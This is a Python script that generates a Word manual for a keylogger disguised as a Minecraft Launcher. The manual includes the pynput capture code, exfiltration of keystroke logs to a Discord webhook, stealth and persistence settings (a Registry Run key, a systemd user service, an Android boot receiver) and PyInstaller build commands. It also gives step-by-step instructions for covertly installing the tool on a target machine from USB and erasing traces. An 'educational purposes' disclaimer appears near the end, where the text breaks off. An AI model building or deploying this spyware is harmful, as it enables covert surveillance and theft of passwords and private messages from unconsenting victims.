"""
Script to create a comprehensive reference Word document for the Minecraft Keylogger Project
"""

from docx import Document
from docx.shared import Inches, Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
import os
from datetime import datetime

def add_horizontal_line(paragraph):
    """Add a horizontal line to a paragraph"""
    p = paragraph._element
    pPr = p.get_or_add_pPr()
    pBdr = OxmlElement('w:pBdr')
    pPr.insert_element_before(pBdr,
        'w:shd', 'w:tabs', 'w:suppressAutoHyphens', 'w:kinsoku', 'w:wordWrap',
        'w:overflowPunct', 'w:topLinePunct', 'w:autoSpaceDE', 'w:autoSpaceDN',
        'w:bidi', 'w:adjustRightInd', 'w:snapToGrid', 'w:spacing', 'w:ind',
        'w:contextualSpacing', 'w:mirrorIndents', 'w:suppressOverlap', 'w:jc',
        'w:textDirection', 'w:textAlignment', 'w:textboxTightWrap',
        'w:outlineLvl', 'w:divId', 'w:cnfStyle', 'w:rPr', 'w:sectPr',
        'w:pPrChange'
    )
    bottom = OxmlElement('w:bottom')
    bottom.set(qn('w:val'), 'single')
    bottom.set(qn('w:sz'), '6')
    bottom.set(qn('w:space'), '1')
    bottom.set(qn('w:color'), 'auto')
    pBdr.append(bottom)

def create_reference_document():
    """Create the reference Word document"""
    doc = Document()
    
    # Set default font
    style = doc.styles['Normal']
    font = style.font
    font.name = 'Calibri'
    font.size = Pt(11)
    
    # ===== TITLE PAGE =====
    title = doc.add_heading('MINECRAFT KEYLOGGER PROJECT', 0)
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    title_run = title.runs[0]
    title_run.font.size = Pt(24)
    title_run.font.color.rgb = RGBColor(0, 51, 102)
    
    subtitle = doc.add_paragraph('Complete Reference Documentation')
    subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
    subtitle_run = subtitle.runs[0]
    subtitle_run.font.size = Pt(16)
    subtitle_run.font.color.rgb = RGBColor(102, 102, 102)
    subtitle_run.italic = True
    
    doc.add_paragraph()
    doc.add_paragraph()
    
    # Project info
    info_para = doc.add_paragraph()
    info_para.alignment = WD_ALIGN_PARAGRAPH.CENTER
    info_para.add_run('Educational Cybersecurity Research Project\n').bold = True
    info_para.add_run(f'Generated: {datetime.now().strftime("%B %d, %Y")}\n')
    info_para.add_run('Multi-Platform Keylogger with Encryption & Stealth Capabilities')
    
    doc.add_page_break()
    
    # ===== TABLE OF CONTENTS =====
    doc.add_heading('Table of Contents', 1)
    
    toc_items = [
        ('1', 'Project Overview'),
        ('2', 'Project Architecture'),
        ('3', 'Core Components'),
        ('4', 'File Structure'),
        ('5', 'Technical Specifications'),
        ('6', 'Security Features'),
        ('7', 'Platform Support'),
        ('8', 'Build & Deployment'),
        ('9', 'Usage Instructions'),
        ('10', 'API Reference'),
        ('11', 'Configuration'),
        ('12', 'Troubleshooting'),
        ('13', 'Legal & Ethical Considerations'),
    ]
    
    for num, item in toc_items:
        p = doc.add_paragraph(style='List Number')
        p.add_run(f'{item}')
    
    doc.add_page_break()
    
    # ===== 1. PROJECT OVERVIEW =====
    doc.add_heading('1. Project Overview', 1)
    
    doc.add_heading('1.1 Description', 2)
    p = doc.add_paragraph(
        'The Minecraft Keylogger Project is a sophisticated, cross-platform keystroke logging application '
        'designed for educational cybersecurity research and penetration testing. Disguised as a Minecraft '
        'Launcher, it demonstrates advanced stealth techniques, encryption, and remote data exfiltration.'
    )
    
    doc.add_heading('1.2 Key Features', 2)
    features = [
        'Cross-platform support (Windows, Linux, Android)',
        'AES-256 encryption for secure log storage',
        'Biometric authentication using facial recognition',
        'Remote data exfiltration via Discord webhooks',
        'Stealth installation and persistence mechanisms',
        'Process hiding and anti-detection techniques',
        'Automated startup on system boot',
        'Real-time keystroke capture and processing',
    ]
    for feature in features:
        doc.add_paragraph(feature, style='List Bullet')
    
    doc.add_heading('1.3 Technology Stack', 2)
    
    # Create technology table
    table = doc.add_table(rows=1, cols=2)
    table.style = 'Light Grid Accent 1'
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Component'
    hdr_cells[1].text = 'Technology'
    
    tech_stack = [
        ('Programming Language', 'Python 3.13'),
        ('Keystroke Capture', 'pynput library'),
        ('Encryption', 'cryptography (Fernet/AES-256)'),
        ('Face Recognition', 'OpenCV with Haar Cascades + LBPH'),
        ('Network Communication', 'urllib (built-in)'),
        ('Build Tool', 'PyInstaller'),
        ('Android Build', 'Buildozer'),
        ('GUI Framework', 'None (headless operation)'),
    ]
    
    for component, tech in tech_stack:
        row_cells = table.add_row().cells
        row_cells[0].text = component
        row_cells[1].text = tech
    
    doc.add_page_break()
    
    # ===== 2. PROJECT ARCHITECTURE =====
    doc.add_heading('2. Project Architecture', 1)
    
    doc.add_heading('2.1 System Components', 2)
    p = doc.add_paragraph(
        'The system consists of several modular components that work together to capture, '
        'process, encrypt, and exfiltrate keystroke data:'
    )
    
    # Component table
    table = doc.add_table(rows=1, cols=4)
    table.style = 'Light Grid Accent 1'
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Component'
    hdr_cells[1].text = 'File'
    hdr_cells[2].text = 'Purpose'
    hdr_cells[3].text = 'LOC'
    
    components = [
        ('Main Controller', 'main.py', 'Orchestrates all components', '96'),
        ('Keylogger Engine', 'logger.py', 'Captures keystrokes', '25'),
        ('Input Processor', 'processor.py', 'Processes keystrokes', '71'),
        ('Encryption Module', 'crypto_utils.py', 'AES-256 encryption', '31'),
        ('Face Authentication', 'face_auth.py', 'Biometric access', '142'),
        ('Network Sender', 'network_sender.py', 'Remote exfiltration', '58'),
        ('Log Viewer', 'view_logs.py', 'Decrypt & view logs', '140'),
        ('System Info', 'system_info.py', 'System reconnaissance', '450+'),
    ]
    
    for comp, file, purpose, loc in components:
        row_cells = table.add_row().cells
        row_cells[0].text = comp
        row_cells[1].text = file
        row_cells[2].text = purpose
        row_cells[3].text = loc
    
    doc.add_heading('2.2 Data Flow', 2)
    flow_steps = [
        'User presses a key on the keyboard',
        'pynput listener captures the keystroke event',
        'InputProcessor processes and formats the keystroke',
        'Text buffer is updated with the new character',
        'Crypto module encrypts the entire buffer using AES-256',
        'Encrypted data is saved to captured_text.enc',
        'Plaintext backup saved to captured_text.txt (optional)',
        'Every 30 seconds, NetworkSender exfiltrates logs to Discord',
        'Logs can be viewed locally using face authentication',
    ]
    
    for i, step in enumerate(flow_steps, 1):
        p = doc.add_paragraph(style='List Number')
        p.add_run(step)
    
    doc.add_page_break()
    
    # ===== 3. CORE COMPONENTS =====
    doc.add_heading('3. Core Components', 1)
    
    doc.add_heading('3.1 Keylogger Engine (logger.py)', 2)
    p = doc.add_paragraph('The keylogger engine uses the pynput library to capture keyboard events:')
    
    code = doc.add_paragraph(
        'from pynput import keyboard\n\n'
        'class KeyLogger:\n'
        '    def __init__(self, on_key_event):\n'
        '        self.on_key_event = on_key_event\n'
        '        self.listener = None\n\n'
        '    def start(self):\n'
        '        self.listener = keyboard.Listener(on_press=self._on_press)\n'
        '        self.listener.start()\n\n'
        '    def _on_press(self, key):\n'
        '        self.on_key_event(key)',
        style='No Spacing'
    )
    code_run = code.runs[0]
    code_run.font.name = 'Courier New'
    code_run.font.size = Pt(9)
    
    doc.add_heading('3.2 Input Processor (processor.py)', 2)
    p = doc.add_paragraph('Processes raw keystroke events and maintains a text buffer:')
    
    features_list = [
        'Distinguishes between regular characters and special keys',
        'Maintains a list-based buffer for efficient operations',
        'Handles backspace, enter, space, and arrow keys',
        'Preserves all keystrokes including modifiers',
        'Reconstructs full text on each keystroke',
    ]
    for feature in features_list:
        doc.add_paragraph(feature, style='List Bullet')
    
    doc.add_heading('3.3 Encryption Module (crypto_utils.py)', 2)
    p = doc.add_paragraph('Implements AES-256 encryption using the Fernet symmetric encryption:')
    
    encryption_features = [
        'Algorithm: AES-256-CBC with PKCS7 padding',
        'Authentication: HMAC-SHA256 for integrity verification',
        'Key Size: 256 bits (32 bytes)',
        'Encoding: Base64 for encrypted output',
        'Timestamp: Included to prevent replay attacks',
    ]
    for feature in encryption_features:
        doc.add_paragraph(feature, style='List Bullet')
    
    doc.add_heading('3.4 Face Authentication (face_auth.py)', 2)
    p = doc.add_paragraph('Provides biometric security for log access:')
    
    face_features = [
        'Face Detection: Haar Cascade Classifier (Viola-Jones algorithm)',
        'Face Recognition: LBPH (Local Binary Patterns Histograms)',
        'Training: Captures 30 face samples to build model',
        'Confidence Threshold: < 50 for successful authentication',
        'Model Storage: face_model.yml (local storage)',
    ]
    for feature in face_features:
        doc.add_paragraph(feature, style='List Bullet')
    
    doc.add_heading('3.5 Network Sender (network_sender.py)', 2)
    p = doc.add_paragraph('Handles remote data exfiltration via Discord webhooks:')
    
    network_features = [
        'Protocol: HTTPS POST with JSON payload',
        'Destination: Discord webhook URL',
        'Interval: Configurable (default 30 seconds)',
        'Size Limit: 2000 characters (Discord limit)',
        'Connectivity Check: Tests connection before sending',
        'Stealth: Uses standard urllib (no external dependencies)',
    ]
    for feature in network_features:
        doc.add_paragraph(feature, style='List Bullet')
    
    doc.add_page_break()
    
    # ===== 4. FILE STRUCTURE =====
    doc.add_heading('4. File Structure', 1)
    
    doc.add_heading('4.1 Core Files', 2)
    
    file_table = doc.add_table(rows=1, cols=2)
    file_table.style = 'Light Grid Accent 1'
    hdr_cells = file_table.rows[0].cells
    hdr_cells[0].text = 'File/Directory'
    hdr_cells[1].text = 'Description'
    
    files = [
        ('main.py', 'Main entry point and orchestrator'),
        ('logger.py', 'Keystroke capture engine'),
        ('processor.py', 'Keystroke processing logic'),
        ('crypto_utils.py', 'Encryption/decryption functions'),
        ('face_auth.py', 'Facial recognition authentication'),
        ('network_sender.py', 'Remote data exfiltration'),
        ('view_logs.py', 'Log viewer with face auth'),
        ('system_info.py', 'System reconnaissance module'),
        ('secret.key', 'AES-256 encryption key'),
        ('captured_text.enc', 'Encrypted keystroke logs'),
        ('captured_text.txt', 'Plaintext logs (debugging)'),
        ('keylogger.pid', 'Process ID file'),
        ('face_model.yml', 'Trained face recognition model'),
        ('haarcascade_frontalface_default.xml', 'Face detection model'),
    ]
    
    for file, desc in files:
        row_cells = file_table.add_row().cells
        row_cells[0].text = file
        row_cells[1].text = desc
    
    doc.add_heading('4.2 Build Scripts', 2)
    
    build_table = doc.add_table(rows=1, cols=2)
    build_table.style = 'Light Grid Accent 1'
    hdr_cells = build_table.rows[0].cells
    hdr_cells[0].text = 'Script'
    hdr_cells[1].text = 'Purpose'
    
    build_scripts = [
        ('build_portable.bat', 'Build Windows executable'),
        ('build_portable_linux.sh', 'Build Linux executable'),
        ('create_android_package.bat', 'Build Android APK'),
        ('build_all_platforms.sh', 'Build for all platforms'),
        ('buildozer.spec', 'Android build configuration'),
        ('Minecraft_Launcher.spec', 'PyInstaller spec for Windows'),
        ('Minecraft_Launcher_Linux.spec', 'PyInstaller spec for Linux'),
    ]
    
    for script, purpose in build_scripts:
        row_cells = build_table.add_row().cells
        row_cells[0].text = script
        row_cells[1].text = purpose
    
    doc.add_heading('4.3 Documentation Files', 2)
    
    doc_table = doc.add_table(rows=1, cols=2)
    doc_table.style = 'Light Grid Accent 1'
    hdr_cells = doc_table.rows[0].cells
    hdr_cells[0].text = 'Document'
    hdr_cells[1].text = 'Content'
    
    docs = [
        ('README.md', 'Project overview and usage'),
        ('CYBERSECURITY_INTERNSHIP_REPORT.md', 'Comprehensive technical report'),
        ('SYSTEM_INFO_README.md', 'System info module documentation'),
        ('BUILD_INSTRUCTIONS.md', 'Build and deployment guide'),
        ('TRANSFER_TO_LINUX.md', 'Linux deployment instructions'),
    ]
    
    for doc_file, content in docs:
        row_cells = doc_table.add_row().cells
        row_cells[0].text = doc_file
        row_cells[1].text = content
    
    doc.add_page_break()
    
    # ===== 5. TECHNICAL SPECIFICATIONS =====
    doc.add_heading('5. Technical Specifications', 1)
    
    doc.add_heading('5.1 System Requirements', 2)
    
    # Windows requirements
    doc.add_heading('Windows', 3)
    win_reqs = [
        'Operating System: Windows 7/8/10/11 (32-bit or 64-bit)',
        'Python: 3.8+ (for development)',
        'RAM: Minimum 50 MB',
        'Disk Space: ~30 MB',
        'Permissions: User-level (no admin required)',
    ]
    for req in win_reqs:
        doc.add_paragraph(req, style='List Bullet')
    
    # Linux requirements
    doc.add_heading('Linux', 3)
    linux_reqs = [
        'Operating System: Ubuntu 18.04+, Debian 10+, or equivalent',
        'Display Server: X11/Xorg (required for pynput)',
        'Python: 3.8+',
        'RAM: Minimum 50 MB',
        'Disk Space: ~30 MB',
        'Dependencies: python3-xlib, libopencv-dev',
    ]
    for req in linux_reqs:
        doc.add_paragraph(req, style='List Bullet')
    
    # Android requirements
    doc.add_heading('Android', 3)
    android_reqs = [
        'Operating System: Android 5.0+ (API 21+)',
        'RAM: Minimum 100 MB',
        'Permissions: Accessibility Service, Camera, Internet',
        'Special: User must manually enable Accessibility Service',
    ]
    for req in android_reqs:
        doc.add_paragraph(req, style='List Bullet')
    
    doc.add_heading('5.2 Dependencies', 2)
    
    dep_table = doc.add_table(rows=1, cols=3)
    dep_table.style = 'Light Grid Accent 1'
    hdr_cells = dep_table.rows[0].cells
    hdr_cells[0].text = 'Package'
    hdr_cells[1].text = 'Version'
    hdr_cells[2].text = 'Purpose'
    
    dependencies = [
        ('pynput', '1.7.6+', 'Keyboard event capture'),
        ('cryptography', '41.0+', 'AES-256 encryption'),
        ('opencv-python', '4.8+', 'Face detection/recognition'),
        ('numpy', '1.24+', 'Array operations for OpenCV'),
        ('pyinstaller', '5.13+', 'Executable compilation'),
        ('buildozer', '1.5+', 'Android APK building'),
    ]
    
    for package, version, purpose in dependencies:
        row_cells = dep_table.add_row().cells
        row_cells[0].text = package
        row_cells[1].text = version
        row_cells[2].text = purpose
    
    doc.add_page_break()
    
    # ===== 6. SECURITY FEATURES =====
    doc.add_heading('6. Security Features', 1)
    
    doc.add_heading('6.1 Encryption', 2)
    p = doc.add_paragraph('The application uses military-grade encryption:')
    
    enc_table = doc.add_table(rows=1, cols=2)
    enc_table.style = 'Light Grid Accent 1'
    hdr_cells = enc_table.rows[0].cells
    hdr_cells[0].text = 'Feature'
    hdr_cells[1].text = 'Implementation'
    
    encryption_specs = [
        ('Algorithm', 'AES-256-CBC'),
        ('Key Size', '256 bits (32 bytes)'),
        ('Authentication', 'HMAC-SHA256'),
        ('Encoding', 'Base64'),
        ('Timestamp', 'Included (prevents replay)'),
        ('Security Level', 'Military-grade'),
    ]
    
    for feature, impl in encryption_specs:
        row_cells = enc_table.add_row().cells
        row_cells[0].text = feature
        row_cells[1].text = impl
    
    doc.add_heading('6.2 Stealth Mechanisms', 2)
    
    stealth_features = [
        'No console window (--noconsole flag)',
        'Hidden installation directory (AppData/dot-prefix)',
        'Disguised as "Minecraft Launcher"',
        'Minimal CPU usage (event-driven, not polling)',
        'Small memory footprint (~20-30 MB)',
        'HTTPS traffic to legitimate service (Discord)',
        'No unusual system calls or hooks',
    ]
    for feature in stealth_features:
        doc.add_paragraph(feature, style='List Bullet')
    
    doc.add_heading('6.3 Persistence', 2)
    
    # Windows persistence
    doc.add_heading('Windows', 3)
    p = doc.add_paragraph('Registry autostart key:')
    code = doc.add_paragraph(
        'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Minecraft Launcher',
        style='No Spacing'
    )
    code_run = code.runs[0]
    code_run.font.name = 'Courier New'
    code_run.font.size = Pt(9)
    
    # Linux persistence
    doc.add_heading('Linux', 3)
    p = doc.add_paragraph('Systemd user service with auto-restart:')
    linux_persist = [
        'Service file: ~/.config/systemd/user/minecraft-launcher.service',
        'Auto-starts after graphical target',
        'Restarts on crash (Restart=always)',
        'Enabled on boot',
    ]
    for item in linux_persist:
        doc.add_paragraph(item, style='List Bullet')
    
    # Android persistence
    doc.add_heading('Android', 3)
    p = doc.add_paragraph('Boot receiver and background service:')
    android_persist = [
        'RECEIVE_BOOT_COMPLETED permission',
        'Broadcast receiver starts service on boot',
        'Accessibility service (user must enable)',
        'Battery optimization exemption required',
    ]
    for item in android_persist:
        doc.add_paragraph(item, style='List Bullet')
    
    doc.add_page_break()
    
    # ===== 7. PLATFORM SUPPORT =====
    doc.add_heading('7. Platform Support', 1)
    
    doc.add_heading('7.1 Windows', 2)
    
    win_features = [
        'Supported Versions: Windows 7, 8, 10, 11',
        'Architecture: 32-bit and 64-bit',
        'Backend: pynput._win32 (Win32 API hooks)',
        'Installation: %APPDATA%\\Minecraft_Updater',
        'Persistence: Registry Run key',
        'Build Tool: PyInstaller with --noconsole',
    ]
    for feature in win_features:
        doc.add_paragraph(feature, style='List Bullet')
    
    doc.add_heading('7.2 Linux', 2)
    
    linux_features = [
        'Supported Distros: Ubuntu, Debian, Fedora, Arch',
        'Display Server: X11/Xorg required',
        'Backend: pynput._xorg',
        'Installation: ~/.minecraft_updater',
        'Persistence: systemd user service',
        'Build Tool: PyInstaller',
    ]
    for feature in linux_features:
        doc.add_paragraph(feature, style='List Bullet')
    
    doc.add_heading('7.3 Android', 2)
    
    android_features = [
        'Minimum API: 21 (Android 5.0 Lollipop)',
        'Target API: 33 (Android 13)',
        'Required Permissions: Accessibility, Camera, Internet, Boot',
        'Installation: /data/data/com.minecraft.minecraftlauncher',
        'Build Tool: Buildozer',
        'Special: Requires manual Accessibility Service enablement',
    ]
    for feature in android_features:
        doc.add_paragraph(feature, style='List Bullet')
    
    doc.add_page_break()
    
    # ===== 8. BUILD & DEPLOYMENT =====
    doc.add_heading('8. Build & Deployment', 1)
    
    doc.add_heading('8.1 Windows Build', 2)
    
    p = doc.add_paragraph('Build command:')
    code = doc.add_paragraph(
        'pyinstaller --noconsole --onefile --name "Minecraft_Launcher" \\\n'
        '    --add-data "face_model.yml;." \\\n'
        '    --add-data "haarcascade_frontalface_default.xml;." \\\n'
        '    --hidden-import=pynput.keyboard._win32 \\\n'
        '    --hidden-import=pynput.mouse._win32 \\\n'
        '    main.py',
        style='No Spacing'
    )
    code_run = code.runs[0]
    code_run.font.name = 'Courier New'
    code_run.font.size = Pt(8)
    
    p = doc.add_paragraph('Output: dist/Minecraft_Launcher.exe')
    
    doc.add_heading('8.2 Linux Build', 2)
    
    p = doc.add_paragraph('Build command:')
    code = doc.add_paragraph(
        'pyinstaller --noconsole --onefile --name "Minecraft_Launcher" \\\n'
        '    --add-data "face_model.yml:." \\\n'
        '    --add-data "haarcascade_frontalface_default.xml:." \\\n'
        '    --hidden-import=pynput.keyboard._xorg \\\n'
        '    --hidden-import=pynput.mouse._xorg \\\n'
        '    main.py',
        style='No Spacing'
    )
    code_run = code.runs[0]
    code_run.font.name = 'Courier New'
    code_run.font.size = Pt(8)
    
    p = doc.add_paragraph('Output: dist/Minecraft_Launcher')
    
    doc.add_heading('8.3 Android Build', 2)
    
    p = doc.add_paragraph('Build command:')
    code = doc.add_paragraph('buildozer android debug', style='No Spacing')
    code_run = code.runs[0]
    code_run.font.name = 'Courier New'
    code_run.font.size = Pt(9)
    
    p = doc.add_paragraph('Output: bin/minecraftlauncher-0.1-debug.apk')
    
    doc.add_heading('8.4 Deployment', 2)
    
    deployment_steps = [
        'Build the executable for target platform',
        'Copy executable and secret.key to USB drive',
        'Create installation script (Minecraft_Setup.bat/sh)',
        'On target system, run installation script',
        'Script copies files to hidden directory',
        'Script adds persistence mechanism',
        'Script starts the keylogger',
        'Remove USB drive and installation traces',
    ]
    
    for i, step in enumerate(deployment_steps, 1):
        p = doc.add_paragraph(style='List Number')
        p.add_run(step)
    
    doc.add_page_break()
    
    # ===== 9. USAGE INSTRUCTIONS =====
    doc.add_heading('9. Usage Instructions', 1)
    
    doc.add_heading('9.1 Configuration', 2)
    
    p = doc.add_paragraph('Before deployment, configure the Discord webhook:')
    
    config_steps = [
        'Open network_sender.py in a text editor',
        'Locate the WEBHOOK_URL variable',
        'Paste your Discord webhook URL',
        'Optional: Adjust SEND_INTERVAL in main.py (default: 30s)',
        'Save the file',
    ]
    
    for i, step in enumerate(config_steps, 1):
        p = doc.add_paragraph(style='List Number')
        p.add_run(step)
    
    doc.add_heading('9.2 Installation', 2)
    
    install_steps = [
        'Copy the release folder to a USB drive',
        'Plug USB into target computer',
        'Run Minecraft_Setup.bat (Windows) or install.sh (Linux)',
        'Wait for "installation" to complete',
        'Keylogger is now running silently',
    ]
    
    for i, step in enumerate(install_steps, 1):
        p = doc.add_paragraph(style='List Number')
        p.add_run(step)
    
    doc.add_heading('9.3 Viewing Logs', 2)
    
    doc.add_heading('Remote Viewing (Discord)', 3)
    remote_steps = [
        'Open your Discord server',
        'Navigate to the channel with the webhook',
        'Logs are posted every 30 seconds automatically',
    ]
    for step in remote_steps:
        doc.add_paragraph(step, style='List Bullet')
    
    doc.add_heading('Local Viewing', 3)
    local_steps = [
        'Copy captured_text.enc from target to your PC',
        'Copy secret.key from target to your PC',
        'Run: python view_logs.py',
        'Authenticate with your face',
        'Decrypted logs will be displayed',
    ]
    for i, step in enumerate(local_steps, 1):
        p = doc.add_paragraph(style='List Number')
        p.add_run(step)
    
    doc.add_heading('9.4 Uninstallation', 2)
    
    p = doc.add_paragraph('To remove the keylogger from a system:')
    
    # Windows uninstall
    doc.add_heading('Windows', 3)
    code = doc.add_paragraph(
        'taskkill /F /IM "Minecraft_Launcher.exe"\n'
        'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Minecraft Launcher" /f\n'
        'rmdir /s /q "%APPDATA%\\Minecraft_Updater"',
        style='No Spacing'
    )
    code_run = code.runs[0]
    code_run.font.name = 'Courier New'
    code_run.font.size = Pt(9)
    
    # Linux uninstall
    doc.add_heading('Linux', 3)
    code = doc.add_paragraph(
        'systemctl --user stop minecraft-launcher.service\n'
        'systemctl --user disable minecraft-launcher.service\n'
        'rm ~/.config/systemd/user/minecraft-launcher.service\n'
        'pkill -f "Minecraft_Launcher"\n'
        'rm -rf ~/.minecraft_updater',
        style='No Spacing'
    )
    code_run = code.runs[0]
    code_run.font.name = 'Courier New'
    code_run.font.size = Pt(9)
    
    doc.add_page_break()
    
    # ===== 10. API REFERENCE =====
    doc.add_heading('10. API Reference', 1)
    
    doc.add_heading('10.1 KeyLogger Class', 2)
    
    p = doc.add_paragraph()
    p.add_run('Class: ').bold = True
    p.add_run('KeyLogger')
    
    p = doc.add_paragraph()
    p.add_run('Purpose: ').bold = True
    p.add_run('Captures keyboard events using pynput')
    
    p = doc.add_paragraph()
    p.add_run('Methods:').bold = True
    
    methods = [
        '__init__(on_key_event): Initialize with callback function',
        'start(): Start the keyboard listener',
        '_on_press(key): Internal callback for key press events',
    ]
    for method in methods:
        doc.add_paragraph(method, style='List Bullet')
    
    doc.add_heading('10.2 InputProcessor Class', 2)
    
    p = doc.add_paragraph()
    p.add_run('Class: ').bold = True
    p.add_run('InputProcessor')
    
    p = doc.add_paragraph()
    p.add_run('Purpose: ').bold = True
    p.add_run('Processes and formats keystroke events')
    
    p = doc.add_paragraph()
    p.add_run('Methods:').bold = True
    
    methods = [
        '__init__(initial_text=""): Initialize with optional existing text',
        'process_key(key): Process a keystroke and return (char, full_text)',
        'get_text(): Return the current text buffer',
    ]
    for method in methods:
        doc.add_paragraph(method, style='List Bullet')
    
    doc.add_heading('10.3 Crypto Utils Module', 2)
    
    p = doc.add_paragraph()
    p.add_run('Module: ').bold = True
    p.add_run('crypto_utils')
    
    p = doc.add_paragraph()
    p.add_run('Functions:').bold = True
    
    functions = [
        'generate_key(): Generate and save a new encryption key',
        'load_key(): Load the encryption key from secret.key',
        'encrypt_text(text, key): Encrypt text using Fernet',
        'decrypt_text(encrypted_data, key): Decrypt data using Fernet',
    ]
    for func in functions:
        doc.add_paragraph(func, style='List Bullet')
    
    doc.add_heading('10.4 Face Auth Module', 2)
    
    p = doc.add_paragraph()
    p.add_run('Module: ').bold = True
    p.add_run('face_auth')
    
    p = doc.add_paragraph()
    p.add_run('Functions:').bold = True
    
    functions = [
        'get_face_detector(): Load Haar Cascade face detector',
        'train_model(): Capture 30 face samples and train LBPH model',
        'authenticate(): Verify user face against trained model',
    ]
    for func in functions:
        doc.add_paragraph(func, style='List Bullet')
    
    doc.add_heading('10.5 Network Sender Module', 2)
    
    p = doc.add_paragraph()
    p.add_run('Module: ').bold = True
    p.add_run('network_sender')
    
    p = doc.add_paragraph()
    p.add_run('Functions:').bold = True
    
    functions = [
        'is_connected(): Check internet connectivity',
        'send_log(message, file_content, filename): Send logs to Discord webhook',
    ]
    for func in functions:
        doc.add_paragraph(func, style='List Bullet')
    
    doc.add_page_break()
    
    # ===== 11. CONFIGURATION =====
    doc.add_heading('11. Configuration', 1)
    
    doc.add_heading('11.1 Network Configuration', 2)
    
    p = doc.add_paragraph()
    p.add_run('File: ').bold = True
    p.add_run('network_sender.py')
    
    config_table = doc.add_table(rows=1, cols=3)
    config_table.style = 'Light Grid Accent 1'
    hdr_cells = config_table.rows[0].cells
    hdr_cells[0].text = 'Variable'
    hdr_cells[1].text = 'Default'
    hdr_cells[2].text = 'Description'
    
    configs = [
        ('WEBHOOK_URL', '""', 'Discord webhook URL for log exfiltration'),
        ('SEND_INTERVAL', '30', 'Seconds between log transmissions'),
        ('USER_AGENT', '"Mozilla/5.0"', 'HTTP User-Agent header'),
    ]
    
    for var, default, desc in configs:
        row_cells = config_table.add_row().cells
        row_cells[0].text = var
        row_cells[1].text = default
        row_cells[2].text = desc
    
    doc.add_heading('11.2 Face Authentication Configuration', 2)
    
    p = doc.add_paragraph()
    p.add_run('File: ').bold = True
    p.add_run('face_auth.py')
    
    config_table = doc.add_table(rows=1, cols=3)
    config_table.style = 'Light Grid Accent 1'
    hdr_cells = config_table.rows[0].cells
    hdr_cells[0].text = 'Variable'
    hdr_cells[1].text = 'Default'
    hdr_cells[2].text = 'Description'
    
    configs = [
        ('SAMPLE_COUNT', '30', 'Number of face samples to capture'),
        ('CONFIDENCE_THRESHOLD', '50', 'Maximum confidence for auth success'),
        ('SCALE_FACTOR', '1.3', 'Face detection scale factor'),
        ('MIN_NEIGHBORS', '5', 'Minimum neighbors for face detection'),
    ]
    
    for var, default, desc in configs:
        row_cells = config_table.add_row().cells
        row_cells[0].text = var
        row_cells[1].text = default
        row_cells[2].text = desc
    
    doc.add_heading('11.3 Build Configuration', 2)
    
    p = doc.add_paragraph()
    p.add_run('File: ').bold = True
    p.add_run('buildozer.spec (Android)')
    
    build_configs = [
        'title: Application display name',
        'package.name: Package identifier',
        'package.domain: Reverse domain name',
        'requirements: Python packages to include',
        'android.permissions: Required Android permissions',
        'android.api: Target Android API level',
        'android.minapi: Minimum Android API level',
    ]
    for config in build_configs:
        doc.add_paragraph(config, style='List Bullet')
    
    doc.add_page_break()
    
    # ===== 12. TROUBLESHOOTING =====
    doc.add_heading('12. Troubleshooting', 1)
    
    doc.add_heading('12.1 Common Issues', 2)
    
    # Issue 1
    p = doc.add_paragraph()
    p.add_run('Issue: ').bold = True
    p.add_run('Keylogger not capturing keystrokes')
    
    p = doc.add_paragraph()
    p.add_run('Solutions:').bold = True
    
    solutions = [
        'Check if process is running (Task Manager / ps)',
        'Verify pynput is installed correctly',
        'On Linux, ensure X11/Xorg is running (not Wayland)',
        'Check file permissions on installation directory',
        'Review captured_text.txt for any output',
    ]
    for solution in solutions:
        doc.add_paragraph(solution, style='List Bullet')
    
    # Issue 2
    p = doc.add_paragraph()
    p.add_run('Issue: ').bold = True
    p.add_run('Logs not being sent to Discord')
    
    p = doc.add_paragraph()
    p.add_run('Solutions:').bold = True
    
    solutions = [
        'Verify WEBHOOK_URL is correctly configured',
        'Test internet connectivity',
        'Check firewall/antivirus settings',
        'Verify Discord webhook is still valid',
        'Check for rate limiting (Discord limits)',
    ]
    for solution in solutions:
        doc.add_paragraph(solution, style='List Bullet')
    
    # Issue 3
    p = doc.add_paragraph()
    p.add_run('Issue: ').bold = True
    p.add_run('Face authentication failing')
    
    p = doc.add_paragraph()
    p.add_run('Solutions:').bold = True
    
    solutions = [
        'Ensure good lighting conditions',
        'Retrain the face model',
        'Check camera is working properly',
        'Verify face_model.yml exists',
        'Adjust confidence threshold',
    ]
    for solution in solutions:
        doc.add_paragraph(solution, style='List Bullet')
    
    # Issue 4
    p = doc.add_paragraph()
    p.add_run('Issue: ').bold = True
    p.add_run('Executable won\'t run on target system')
    
    p = doc.add_paragraph()
    p.add_run('Solutions:').bold = True
    
    solutions = [
        'Check architecture (32-bit vs 64-bit)',
        'Verify all dependencies are bundled',
        'Check antivirus quarantine',
        'Ensure secret.key is in same directory',
        'Run from command line to see error messages',
    ]
    for solution in solutions:
        doc.add_paragraph(solution, style='List Bullet')
    
    doc.add_heading('12.2 Debugging', 2)
    
    debug_tips = [
        'Check captured_text.txt for plaintext logs',
        'Review keylogger.pid to verify process is running',
        'Use view_logs.py to test decryption locally',
        'Run main.py directly (not exe) to see error messages',
        'Check system logs for crashes or errors',
        'Use Process Monitor to track file/registry access',
    ]
    for tip in debug_tips:
        doc.add_paragraph(tip, style='List Bullet')
    
    doc.add_page_break()
    
    # ===== 13. LEGAL & ETHICAL =====
    doc.add_heading('13. Legal & Ethical Considerations', 1)
    
    doc.add_heading('13.1 Disclaimer', 2)
    
    disclaimer = doc.add_paragraph()
    disclaimer_run = disclaimer.add_run(
        'This software is provided for EDUCATIONAL PURPOSES ONLY. The author and contributors '
        'are not responsible for any misuse or damage caused by this software. Using this software '
        'to monitor computers that you do not own or have explicit permission to monitor is ILLEGAL '
        'and UNETHICAL.'
    )
    disclaimer_run.bold = True
    disclaimer_run.font.color.rgb = RGBColor(255, 0, 0)
    
    doc.add_heading('13.2 Legal Restrictions', 2)
    
    legal_points = [
        'Unauthorized computer access is illegal in most jurisdictions',
        'Wiretapping laws prohibit intercepting communications without consent',
